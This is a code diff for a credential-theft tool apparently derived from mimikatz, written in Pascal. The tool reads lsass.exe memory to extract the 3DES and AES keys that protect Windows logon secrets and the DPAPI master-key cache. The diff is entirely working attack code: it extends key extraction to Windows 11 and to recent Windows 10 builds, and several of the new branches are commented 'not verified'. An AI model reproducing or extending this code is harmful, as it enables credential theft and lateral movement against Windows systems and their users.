@@ -540,7 +540,7 @@ if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=fals
 log('TAG:'+strpas(h3DesKey.tag ));
 // Read in the 3DES key
 log('DES:');
-if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
    begin
    if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
    log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
@@ -563,7 +563,7 @@ ReadMem(hprocess, aesOffset, @keyPointer, sizeof(nativeuint));
 ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
 // Read in AES key
 log('AES:');
-if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
    begin
    if ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
    log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
@@ -736,7 +736,10 @@ if lowercase(osarch) ='amd64' then
       IV_OFFSET:=61 ; DES_OFFSET:=-73 ; AES_OFFSET:=16 ; //tested on 1709
       end;
    if (pos('-1809',winver)>0) or (pos('-1903',winver)>0) or (pos('-1909',winver)>0)
-      or (pos('-2004',winver)>0) then //win10 1809+
+      or (pos('-2004',winver)>0)
+      or (pos('-20H2',winver)>0) or (pos('-21H1',winver)>0)
+      or (pos('-21H2',winver)>0) //win 11
+      then //win10 1809+
       begin
       setlength(pattern,sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
       CopyMemory(@pattern[0],@PTRN_WN10_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
@@ -749,6 +752,9 @@ if IV_OFFSET=0 then
    log('no offset defined for this OS',1);
    exit;
    end;
+log('IV_OFFSET:'+inttostr(IV_OFFSET));
+log('DES_OFFSET:'+inttostr(DES_OFFSET));
+log('AES_OFFSET:'+inttostr(AES_OFFSET));
 //*************************
 //lets search keySigOffset "offline" i.e NOT in lsass.exe
 hmod:=loadlibrary(pchar(module));
@@ -860,7 +866,7 @@ if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=fals
 log('TAG:'+strpas(h3DesKey.tag ));
 // Read in the 3DES key
 log('DES:');
-if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
    begin
    //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
    //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
@@ -902,7 +908,7 @@ ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
 // Read in AES key
 log('AES:');
 
-if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') or (copy(winver,1,3)='11.') then
    begin
    //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
    //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
@@ -1060,6 +1066,24 @@ result:=false;
       patch_pos:=11;
       end;
    if (pos('-2004',winver)>0) {or (pos('-1909',winver)>0)} then //win10
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      patch_pos:=11;
+      end;
+   if (pos('-20H2',winver)>0) {or (pos('-1909',winver)>0)} then //win10    //not verified
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      patch_pos:=11;
+      end;
+   if (pos('-21H1',winver)>0) {or (pos('-1909',winver)>0)} then //win10    //not verified
+      begin
+      setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
+      patch_pos:=11;
+      end;
+   if (pos('-21H2',winver)>0) {or (pos('-1909',winver)>0)} then //win10 & win11    //not verified
       begin
       setlength(pattern,sizeof(PTRN_WI64_1607_MasterKeyCacheList));
       copymemory(@pattern[0],@PTRN_WI64_1607_MasterKeyCacheList[0],sizeof(PTRN_WI64_1607_MasterKeyCacheList));
